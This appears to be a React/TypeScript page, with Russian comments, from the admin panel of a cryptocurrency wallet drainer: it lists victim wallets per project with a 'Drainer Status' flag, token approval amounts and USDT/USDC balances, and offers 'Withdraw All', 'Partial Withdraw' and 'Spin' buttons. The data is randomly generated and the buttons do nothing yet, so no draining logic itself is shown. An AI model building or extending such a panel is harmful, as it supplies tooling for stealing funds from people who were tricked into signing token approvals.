import React, { useState } from 'react';
import { useParams, Link } from 'react-router-dom';
import { ArrowLeft, Search, Pin, Trash2, DollarSign, RotateCw, Copy, Check, X, Wallet, ArrowUpRight } from 'lucide-react';
import UserModal from '../components/UserModal';
import DeleteConfirmModal from '../components/DeleteConfirmModal';
import { motion, AnimatePresence } from 'framer-motion';

interface Network {
  id: string;
  name: string;
  symbol: string;
  color: string;
}

interface Contract {
  id: string;
  name: string;
  address: string;
  network: Network;
  token: string; // USDT, USDC, etc.
  balance: number;
  usdBalance: number;
}

interface User {
  id: string;
  walletAddress: string;
  balance: {
    token: string; // USDT или USDC
    amount: number; // количество токенов
    usd: number; // USD стоимость
  };
  isDrainerConnected: boolean;
  approveAmount: number;
  isPinned: boolean;
}

interface Project {
  id: string;
  name: string;
  walletAddress: string; // Один кошелек на проект
  contracts: Contract[]; // Контракты могут быть в разных сетях
  users: User[];
}

const ProjectDetails: React.FC = () => {
  const { projectId } = useParams();
  
  const networks: Network[] = [
    { id: 'eth', name: 'Ethereum', symbol: 'ETH', color: '#627EEA' },
    { id: 'bsc', name: 'BSC', symbol: 'BNB', color: '#F3BA2F' },
    { id: 'polygon', name: 'Polygon', symbol: 'MATIC', color: '#8247E5' },
    { id: 'arbitrum', name: 'Arbitrum', symbol: 'ARB', color: '#28A0F0' }
  ];

  // Генератор случайных проектов (тот же что и в Projects.tsx)
  const generateProjects = (count: number): Project[] => {
    const projectNames = [
      'DD', 'XProject', 'CryptoFlow', 'DefiMaster', 'TokenVault', 'ChainLink', 
      'MetaSwap', 'EtherBridge', 'PolyDex', 'ArbiTrade', 'BSCVault', 'UniFlow',
      'PancakeBot', 'SushiDrain', 'CurveMax', 'BalancerPro', 'CompoundX', 'AaveFlow',
      'YearnVault', 'SynthetixBot', 'MakerDAO', 'USDCVault', 'TetherMax', 'BinanceChain',
      'PolygonBridge', 'ArbitrumDex', 'OptimismFlow', 'FantomSwap', 'AvalancheBot', 'SolanaLink',
      'CosmosHub', 'TerraLuna', 'AlgorandDex', 'CardanoSwap', 'PolkadotBridge', 'KusamaFlow',
      'NearProtocol', 'HarmonyOne', 'ElrondMax', 'HecoChain', 'OKExChain', 'XDaiChain',
      'CeloNetwork', 'FlowBlockchain', 'TezosSwap', 'ZilliqaBot', 'NeoChain', 'VeChainThor',
      'ICONLoop', 'WavesExchange', 'OntologyBot', 'QtumChain', 'ZcashPrivacy', 'MoneroMax'
    ];

    const tokens = ['USDT', 'USDC'];

    return Array.from({ length: count }, (_, i) => {
      const projectName = projectNames[i % projectNames.length] + (i >= projectNames.length ? ` ${Math.floor(i / projectNames.length) + 1}` : '');
      
      // Генерируем случайное количество контрактов (1-8)
      const contractCount = Math.floor(Math.random() * 8) + 1;
      const contracts: Contract[] = [];
      
      for (let j = 0; j < contractCount; j++) {
        const network = networks[Math.floor(Math.random() * networks.length)];
        const token = tokens[Math.floor(Math.random() * tokens.length)];
        const balance = Math.random() * 10000;
        
        contracts.push({
          id: `c${i}_${j}`,
          name: `${token} Contract (${network.name})`,
          address: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
          network,
          token,
          balance,
          usdBalance: balance * (token === 'USDT' ? 1 : 0.999) // USDC немного дешевле
        });
      }

      // Генерируем пользователей для проекта - теперь с USDT/USDC балансами
      const userCount = Math.floor(Math.random() * 15) + 1;
      const users: User[] = Array.from({ length: userCount }, (_, k) => {
        const userToken = tokens[Math.floor(Math.random() * tokens.length)];
        const tokenAmount = Math.random() * 5000 + 100; // от 100 до 5100 токенов
        const usdValue = tokenAmount * (userToken === 'USDT' ? 1 : 0.999);
        
        return {
          id: `user${i}_${k}`,
          walletAddress: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
          balance: {
            token: userToken, // USDT или USDC
            amount: tokenAmount,
            usd: usdValue
          },
          isDrainerConnected: Math.random() > 0.2,
          approveAmount: Math.random() * 5000,
          isPinned: Math.random() > 0.8
        };
      });

      return {
        id: (i + 1).toString(),
        name: projectName,
        walletAddress: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
        contracts,
        users
      };
    });
  };

  // Генерируем 50 проектов
  const [projects] = useState<Project[]>(generateProjects(50));
  
  // Находим текущий проект
  const project = projects.find(p => p.id === projectId);

  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [showUserModal, setShowUserModal] = useState(false);
  const [showDeleteModal, setShowDeleteModal] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
  const [userSearch, setUserSearch] = useState('');

  const handleCopyAddress = async (address: string) => {
    await navigator.clipboard.writeText(address);
    setCopiedAddress(address);
    setTimeout(() => setCopiedAddress(null), 2000);
  };

  const filteredUsers = project?.users.filter(user =>
    user.id.toLowerCase().includes(userSearch.toLowerCase()) ||
    user.walletAddress.toLowerCase().includes(userSearch.toLowerCase())
  ) || [];

  const getTotalUsdValue = (project: Project) => {
    return project.contracts.reduce((sum, contract) => sum + contract.usdBalance, 0);
  };

  if (!project) {
    return (
      <div className="max-w-7xl mx-auto">
        <div className="text-center py-12">
          <h1 className="text-2xl font-bold mb-4">Project Not Found</h1>
          <p className="text-gray-400 mb-6">The project you're looking for doesn't exist.</p>
          <Link
            to="/projects"
            className="inline-flex items-center gap-2 px-4 py-2 bg-green-400 text-[#1e1f25] rounded-lg hover:bg-green-500 transition-colors"
          >
            <ArrowLeft size={20} />
            Back to Projects
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-7xl mx-auto space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <Link
            to="/projects"
            className="flex items-center gap-2 px-3 py-2 bg-[#1e1f25] rounded-lg hover:bg-[#2a2b33] transition-colors"
          >
            <ArrowLeft size={20} />
            Back to Projects
          </Link>
          <div>
            <h1 className="text-2xl font-bold">{project.name}</h1>
            <p className="text-gray-400 mt-1">
              {project.contracts.length} contracts • {project.users.length} users
            </p>
          </div>
        </div>
        <button
          onClick={() => setShowUserModal(true)}
          className="flex items-center gap-2 px-4 py-2 bg-green-400 text-[#1e1f25] rounded-lg hover:bg-green-500 transition-colors"
        >
          <ArrowLeft size={20} />
          Add User
        </button>
      </div>

      {/* Project Overview */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Project Wallet */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-[#1e1f25] p-6 rounded-xl"
        >
          <div className="flex items-center gap-2 mb-4">
            <Wallet className="text-green-400" size={24} />
            <h2 className="text-xl font-semibold">Project Wallet</h2>
          </div>
          <button
            onClick={() => handleCopyAddress(project.walletAddress)}
            className="flex items-center gap-2 px-3 py-2 bg-[#2a2b33] rounded-lg hover:bg-[#353640] transition-colors w-full"
          >
            <span className="font-mono flex-1 text-left">{project.walletAddress}</span>
            {copiedAddress === project.walletAddress ? (
              <Check size={16} className="text-green-400" />
            ) : (
              <Copy size={16} />
            )}
          </button>
        </motion.div>

        {/* Total Value */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="bg-[#1e1f25] p-6 rounded-xl relative overflow-hidden"
        >
          <div className="absolute top-0 right-0 w-32 h-32 bg-green-400/5 rounded-full transform translate-x-8 -translate-y-8" />
          <div className="relative z-10">
            <div className="text-sm text-gray-400 mb-2">Total Value</div>
            <div className="text-3xl font-bold text-green-400">
              ${getTotalUsdValue(project).toLocaleString()}
            </div>
            <div className="text-sm text-gray-400 mt-2">
              Across {project.contracts.length} contracts
            </div>
          </div>
        </motion.div>

        {/* Networks */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="bg-[#1e1f25] p-6 rounded-xl"
        >
          <h3 className="text-lg font-semibold mb-4">Networks</h3>
          <div className="flex gap-2 flex-wrap">
            {Array.from(new Set(project.contracts.map(c => c.network.id))).map(networkId => {
              const network = networks.find(n => n.id === networkId);
              const networkContracts = project.contracts.filter(c => c.network.id === networkId);
              return network ? (
                <div
                  key={networkId}
                  className="flex items-center gap-2 px-3 py-2 bg-[#2a2b33] rounded-lg"
                  title={`${network.name}: ${networkContracts.length} contracts`}
                >
                  <div
                    className="w-3 h-3 rounded-full"
                    style={{ backgroundColor: network.color }}
                  />
                  <span className="text-sm">{network.symbol}</span>
                  <span className="text-xs text-gray-400">({networkContracts.length})</span>
                </div>
              ) : null;
            })}
          </div>
        </motion.div>
      </div>

      {/* Contracts */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3 }}
        className="bg-[#1e1f25] rounded-xl p-6"
      >
        <h2 className="text-xl font-semibold mb-6">Contracts ({project.contracts.length})</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {project.contracts.map(contract => (
            <motion.div
              key={contract.id}
              whileHover={{ scale: 1.02 }}
              className="bg-[#2a2b33] p-4 rounded-lg hover:bg-[#353640] transition-colors"
            >
              <div className="flex items-center justify-between mb-3">
                <div className="flex items-center gap-2">
                  <div
                    className="w-3 h-3 rounded-full"
                    style={{ backgroundColor: contract.network.color }}
                  />
                  <span className="font-medium text-sm">{contract.network.name}</span>
                </div>
                <div className="text-sm font-bold">{contract.token}</div>
              </div>
              <div className="space-y-2">
                <div className="font-mono text-xs text-gray-400 truncate" title={contract.address}>
                  {contract.address}
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400 text-sm">Balance:</span>
                  <span className="text-sm">{contract.balance.toFixed(2)} {contract.token}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400 text-sm">USD Value:</span>
                  <span className="text-sm font-bold">${contract.usdBalance.toLocaleString()}</span>
                </div>
              </div>
            </motion.div>
          ))}
        </div>
      </motion.div>

      {/* Users Section */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.4 }}
        className="bg-[#1e1f25] rounded-xl p-6"
      >
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-xl font-semibold">Users ({project.users.length})</h2>
          
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
            <input
              type="text"
              placeholder="Search users..."
              value={userSearch}
              onChange={(e) => setUserSearch(e.target.value)}
              className="w-64 bg-[#2a2b33] border border-gray-700 rounded-lg py-2 pl-10 pr-4 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
            />
          </div>
        </div>

        {userSearch && (
          <div className="mb-4 text-sm text-gray-400">
            Found {filteredUsers.length} users matching "{userSearch}"
          </div>
        )}

        {/* Users Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
          {filteredUsers.map(user => (
            <motion.button
              key={user.id}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => setSelectedUser(user)}
              className="relative bg-[#2a2b33] p-4 rounded-lg text-left hover:bg-[#353640] transition-all duration-300 group"
            >
              {/* Gradient Border */}
              <div className="absolute inset-0 rounded-lg bg-gradient-to-br from-green-400/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
              
              {/* Content */}
              <div className="relative z-10">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${user.isDrainerConnected ? 'bg-green-400' : 'bg-red-400'}`} />
                    <span className="font-mono text-sm truncate" title={user.walletAddress}>
                      {user.walletAddress}
                    </span>
                  </div>
                  {user.isPinned && (
                    <Pin size={16} className="text-green-400" />
                  )}
                </div>

                <div className="space-y-2">
                  <div className="text-sm text-gray-400">
                    ID: {user.id}
                  </div>
                  {/* Показываем баланс в USDT/USDC */}
                  <div className="space-y-1">
                    <div className="flex items-center gap-2 text-lg font-medium">
                      <ArrowUpRight size={20} className="text-green-400" />
                      {user.balance.amount.toFixed(2)} {user.balance.token}
                    </div>
                    <div className="text-sm text-gray-400">
                      ≈ ${user.balance.usd.toLocaleString()}
                    </div>
                  </div>
                  <div className="text-xs text-gray-400">
                    Approve: ${user.approveAmount.toLocaleString()}
                  </div>
                </div>

                <div className="absolute bottom-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity">
                  <div className="text-green-400/30 transform rotate-45">
                    <ArrowUpRight size={40} />
                  </div>
                </div>
              </div>
            </motion.button>
          ))}
        </div>

        {/* Показываем сообщение если нет пользователей */}
        {filteredUsers.length === 0 && userSearch && (
          <div className="text-center py-8">
            <div className="text-gray-400">No users found matching "{userSearch}"</div>
          </div>
        )}
      </motion.div>

      {/* User Details Modal */}
      <AnimatePresence>
        {selectedUser && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50"
            onClick={() => setSelectedUser(null)}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-[#1e1f25] rounded-xl p-6 w-full max-w-2xl m-4 shadow-xl"
            >
              <div className="flex justify-between items-start mb-6">
                <div className="space-y-2">
                  <h2 className="text-xl font-bold">User Details</h2>
                  <div className="space-y-1">
                    <div className="text-sm text-gray-400">User ID:</div>
                    <div className="font-medium">{selectedUser.id}</div>
                  </div>
                  <div className="space-y-1">
                    <div className="text-sm text-gray-400">Wallet Address:</div>
                    <button
                      onClick={() => handleCopyAddress(selectedUser.walletAddress)}
                      className="flex items-center gap-2 px-3 py-1.5 bg-[#2a2b33] rounded-lg hover:bg-[#353640] transition-colors"
                    >
                      <span className="font-mono">{selectedUser.walletAddress}</span>
                      {copiedAddress === selectedUser.walletAddress ? (
                        <Check size={16} className="text-green-400" />
                      ) : (
                        <Copy size={16} />
                      )}
                    </button>
                  </div>
                </div>
                <button
                  onClick={() => setSelectedUser(null)}
                  className="p-2 hover:bg-[#2a2b33] rounded-lg transition-colors"
                >
                  <X size={24} />
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Balance</div>
                  <div className="text-xl font-bold">
                    {selectedUser.balance.amount.toFixed(2)} {selectedUser.balance.token}
                  </div>
                  <div className="text-sm text-gray-400">
                    ≈ ${selectedUser.balance.usd.toLocaleString()}
                  </div>
                </div>
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Drainer Status</div>
                  <div className={selectedUser.isDrainerConnected ? 'text-green-400' : 'text-red-400'}>
                    {selectedUser.isDrainerConnected ? 'Connected' : 'Disconnected'}
                  </div>
                </div>
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Approve Amount</div>
                  <div>${selectedUser.approveAmount.toLocaleString()}</div>
                </div>
              </div>

              <div className="flex gap-2">
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => {}}
                  className="flex items-center gap-2 bg-green-400 text-[#1e1f25] px-4 py-2 rounded-lg hover:bg-green-500 transition-colors"
                >
                  <DollarSign size={20} />
                  Withdraw All
                </motion.button>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => {}}
                  className="flex items-center gap-2 bg-[#2a2b33] text-white px-4 py-2 rounded-lg hover:bg-[#353640] transition-colors"
                >
                  <DollarSign size={20} />
                  Partial Withdraw
                </motion.button>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => {}}
                  className="flex items-center gap-2 bg-[#2a2b33] text-white px-4 py-2 rounded-lg hover:bg-[#353640] transition-colors"
                >
                  <RotateCw size={20} />
                  Spin
                </motion.button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Add User Modal */}
      <UserModal
        isOpen={showUserModal}
        onClose={() => setShowUserModal(false)}
        onSubmit={(userData) => {
          console.log('Add user:', userData);
          setShowUserModal(false);
        }}
      />

      {/* Delete Confirmation Modal */}
      <DeleteConfirmModal
        isOpen={showDeleteModal}
        onClose={() => setShowDeleteModal(false)}
        onConfirm={() => {
          console.log('Delete user:', selectedUser);
          setShowDeleteModal(false);
        }}
      />
    </div>
  );
};

export default ProjectDetails;